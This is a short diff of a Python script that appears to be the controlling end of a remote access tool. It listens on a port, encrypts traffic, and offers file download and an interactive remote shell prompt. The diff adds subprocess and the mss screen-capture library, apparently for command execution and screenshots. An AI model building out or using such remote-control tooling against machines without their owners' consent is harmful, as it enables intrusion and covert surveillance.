@@ -1,4 +1,4 @@
-import socket, select, time, rsa, os, threading, readline as _
+import socket, select, time, rsa, os, threading, readline as _, subprocess, mss
 from cryptography.fernet import Fernet
 
 address = ("0.0.0.0", 3000)
@@ -181,8 +181,6 @@ def download_file(file_name, buff_size=524288):
     
 
 def open_shell():
-    global client_con, authed
-
     while True:
         cmd = input("bebop831#: ")
         if cmd:
@@ -267,3 +265,7 @@ def main():
 
 
 main()
+
+
+
+
